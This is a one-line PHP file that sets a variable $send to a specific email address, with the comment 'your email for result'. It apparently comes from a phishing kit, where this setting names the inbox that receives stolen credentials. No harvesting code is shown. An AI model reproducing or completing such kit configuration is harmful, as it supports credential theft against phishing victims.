<?php
$send="fctdoitall@yandex.com"// your email for result
?>